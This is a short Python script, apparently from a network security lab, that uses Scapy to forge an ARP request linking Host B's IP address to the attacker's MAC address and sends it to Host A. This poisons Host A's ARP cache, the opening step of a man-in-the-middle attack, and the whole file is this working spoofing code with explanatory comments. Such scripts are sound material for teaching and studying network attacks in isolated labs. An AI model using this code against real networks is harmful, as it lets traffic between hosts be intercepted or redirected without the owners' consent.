#!/usr/bin/env python3
from scapy.all import *
E = Ether(dst = '02:42:0a:09:00:05', src='02:42:0a:09:00:69') #from attacker MAC to HostA MAC
#ARP(hwsrc="Attacker MAC", psrc="HostB IP", hwdst="HostA MAC" ,pdst="HostA IP")
A = ARP(hwsrc='02:42:0a:09:00:69', psrc='10.9.0.6', hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')#Constructs a ARP packet with B's IP mapped to attackers MAC address.
A.op = 1 # 1 for ARP request; 2 for ARP reply
pkt = E/A
pkt.show()
sendp(pkt)
